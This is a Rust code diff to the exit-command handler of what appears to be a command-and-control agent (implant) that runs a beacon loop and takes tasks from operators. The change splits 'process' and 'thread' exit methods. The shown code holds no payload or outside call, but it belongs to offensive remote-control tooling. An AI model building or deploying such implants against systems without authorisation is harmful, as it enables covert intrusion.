@@ -8,10 +8,7 @@ use crate::{EXIT_PROCESS, SHOULD_EXIT};
 #[derive(Deserialize)]
 struct Params {
     /// "process" terminates the entire agent process after flushing the
-    /// pending response. "thread" is no longer supported (the agent runs
-    /// the beacon loop inline; stop-the-loop = stop-the-process). Kept in
-    /// the schema for backwards-compat with old operators, but maps to
-    /// process exit.
+    /// pending response.
     #[serde(default = "default_method")]
     method: String,
 }
@@ -26,20 +23,27 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
         .unwrap_or_else(|_| default_method());
 
     match method.as_str() {
-        "process" | "thread" => {
+        "process" => {
             info!("[exit] scheduling process termination after response flush");
             SHOULD_EXIT.store(true, Ordering::Relaxed);
             EXIT_PROCESS.store(true, Ordering::Relaxed);
-            let note = if method == "thread" {
-                " (legacy 'thread' method maps to process exit)"
-            } else {
-                ""
-            };
             TaskResponse {
                 task_id: task.id,
                 completed: Some(true),
                 status: Some("completed".into()),
-                user_output: Some(format!("agent process exiting{note}")),
+                user_output: Some("agent process exiting".into()),
+                ..Default::default()
+            }
+        }
+        "thread" => {
+            info!("[exit] scheduling agent loop stop after response flush");
+            SHOULD_EXIT.store(true, Ordering::Relaxed);
+            EXIT_PROCESS.store(false, Ordering::Relaxed);
+            TaskResponse {
+                task_id: task.id,
+                completed: Some(true),
+                status: Some("completed".into()),
+                user_output: Some("agent thread exiting".into()),
                 ..Default::default()
             }
         }
